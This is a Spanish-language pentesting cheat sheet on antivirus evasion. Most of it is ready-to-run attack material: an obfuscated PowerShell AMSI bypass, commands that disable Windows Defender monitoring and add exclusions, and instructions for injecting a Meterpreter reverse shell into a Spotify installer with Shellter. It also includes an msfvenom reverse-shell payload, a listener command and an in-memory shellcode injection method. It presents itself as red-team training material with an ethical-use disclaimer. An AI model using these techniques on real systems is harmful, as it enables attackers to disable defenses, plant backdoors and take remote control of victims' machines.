# Técnicas de Evasión y Bypass de Antivirus

Este documento detalla técnicas avanzadas para evadir software antivirus (AV), destinadas para uso ético en pruebas de penetración y actividades de red team. Incluye métodos prácticos, herramientas y ejemplos, con un enfoque en la inyección en memoria basada en PowerShell como técnica clave.

## Bypass de AMSI y Política de Ejecución

### Bypass de Política de Ejecución
- **Comando:**
    ```
    PS C:\> powershell -ep bypass
    ```
- **Descripción:** Desactiva las políticas de ejecución de PowerShell, permitiendo que los scripts se ejecuten sin restricciones impuestas por la configuración de seguridad predeterminada.

### Bypass de AMSI
- **Comando:**
    ```powershell
    sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
    ```
- **Descripción:** Desactiva la Interfaz de Escaneo Antimalware de Windows (AMSI) modificando dinámicamente una variable para forzar un fallo de inicialización. Esta técnica sigue sin parchearse por Microsoft y es efectiva para ejecutar scripts maliciosos sin ser detectados por motores de escaneo integrados.

## Desactivar AV (Solo Administradores)

### Desactivar Funciones de AV
- **Comando:**
    ```powershell
    powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
    ```
- **Descripción:** Desactiva múltiples funciones de protección de Windows Defender (monitoreo en tiempo real, escaneo de scripts, monitoreo de comportamiento, etc.). Requiere privilegios administrativos.

### Excluir Rutas o Procesos
- **Comando:**
    ```powershell
    powershell -command 'Add-MpPreference -ExclusionPath "c:\temp" -ExclusionProcess "c:\temp\yourstuffs.exe"'
    ```
- **Descripción:** Excluye directorios o procesos específicos de los escaneos de Windows Defender, permitiendo que archivos potencialmente maliciosos se ejecuten sin interferencias.

## Técnicas de Inyección de Código

### Shellter
- **Descripción:** Shellter inyecta cargas útiles en archivos ejecutables portátiles (PE) legítimos, como instaladores de aplicaciones populares (por ejemplo, Spotify). Modifica el flujo de ejecución para insertar código malicioso.
- **Instalación en Kali:**
    ```bash
    kali@kali:~$ sudo apt install wine
    kali@kali:~$ sudo dpkg --add-architecture amd64
    kali@kali:~$ sudo apt install -y qemu-user-static binfmt-support
    kali@kali:~$ sudo apt-get update && apt-get install wine32
    ```
- **Uso Básico:**
    1. Ejecuta `shellter` en Kali bajo Wine.
    2. Selecciona el modo "Auto" (A).
    3. Especifica un archivo PE objetivo (por ejemplo, `/home/kali/Downloads/SpotifyFullWin10-32bit.exe`).
    4. Habilita el "Modo Sigiloso" para restaurar el flujo de ejecución original después de la ejecución de la carga útil.
    5. Elige una carga útil (por ejemplo, shell inverso de Meterpreter) y configura LHOST/LPORT.
- **Ejemplo Práctico:**
    - Inyecta una carga útil de Meterpreter en un instalador de Spotify para evadir la detección de Avira.
    - Configura un listener en Kali:
        ```bash
        msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
        ```

### Inyección en Memoria
- **Descripción:** Inyecta shellcode directamente en la memoria de procesos en ejecución, evitando escrituras en disco para evadir la detección estática.
- **Técnicas Comunes:**
    - **Inyección de DLL:** Inyecta una DLL maliciosa en un proceso legítimo.
    - **Process Hollowing:** Reemplaza el contenido de un proceso legítimo con código malicioso.
- **Ventaja:** Altamente efectivo contra análisis basados en disco.

### Inyección en Memoria con PowerShell
- **Descripción:** Aprovecha la capacidad de PowerShell para interactuar con las API de Windows y ejecutar cargas útiles maliciosas en la memoria del proceso actual de PowerShell (intérprete x86). Esto evita escrituras en disco, dificultando la detección.
- **Ventajas:**
    - Los scripts son más difíciles de marcar como maliciosos ya que se ejecutan dentro de un intérprete y no como código ejecutable.
    - Fácilmente modificable (nombres de variables, comentarios, lógica) para evadir detección basada en firmas sin necesidad de recompilación.
- **Pasos Clave:**
    1. **Importar APIs de Windows:** Usa `DllImport` para acceder a `VirtualAlloc`, `CreateThread` (de `kernel32.dll`) y `memset` (de `msvcrt.dll`) para asignación de memoria, creación de hilos y escritura de cargas útiles.
    2. **Asignar Memoria:** Reserva un bloque de memoria usando `VirtualAlloc` con permisos de lectura/escritura/ejecución.
    3. **Escribir Carga Útil:** Copia el shellcode byte por byte en la memoria asignada usando `memset`.
    4. **Ejecutar Carga Útil:** Crea un nuevo hilo con `CreateThread` para ejecutar el shellcode.
- **Ejemplo de Script:** *(Ver contenido original para el script completo)*

### Generación de Cargas Útiles
- Genera una carga útil de shell inverso usando `msfvenom`:
    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
    ```
- Copia el array de bytes `$sc` resultante en el script.

## Ofuscación y Cargas Útiles Personalizadas

### Ofuscación
- **Descripción:** Modifica las cargas útiles para evitar coincidencias con firmas conocidas de AV.
- **Técnicas:**
    - Codificación (encoding de datos).
    - Encriptación (encryption de cargas útiles).
    - Polimorfismo (cambios dinámicos en el código).

### Cargas Útiles Personalizadas
- **Descripción:** Crea cargas útiles únicas para evadir detecciones específicas.
- **Herramientas:** Metasploit, Veil (para generar scripts ofuscados).
- **Ejemplo:** Usa Veil para crear un script de PowerShell o batch que evada COMODO AV en un entorno de autoejecución FTP.

## Consejos Generales

- **Conoce el AV Objetivo:**
    - Investiga métodos específicos de detección (firmas, heurísticas, comportamiento).
    - Adapta las técnicas para explotar debilidades identificadas.
- **Uso Ético:**
    - Aplica estas técnicas solo en entornos autorizados (pruebas de penetración, laboratorios).
    - Cumple con las leyes y regulaciones locales.
- **Evolución Constante:**
    - Los AV se actualizan frecuentemente; adapta las técnicas en consecuencia.
    - Consulta recursos como el artículo de Microsoft sobre FinFisher o el documento de Emeric Nasi para métodos avanzados.

## Flujo de Trabajo Ejemplo: Evasión con Shellter
1. **Preparación:**
     - Descarga un ejecutable legítimo (por ejemplo, instalador de Spotify).
     - Instala Shellter en Kali con Wine.
2. **Inyección:**
     - Usa Shellter en modo Auto, habilita el Modo Sigiloso e inyecta una carga útil de Meterpreter.
3. **Ejecución:**
     - Transfiere el archivo modificado a una máquina virtual con Windows y escanea con AV (por ejemplo, Avira).
     - Configura un listener en Kali y verifica la conexión de Meterpreter.
4. **Resultado:** Ejecución exitosa sin detección, preservando la funcionalidad original del programa.
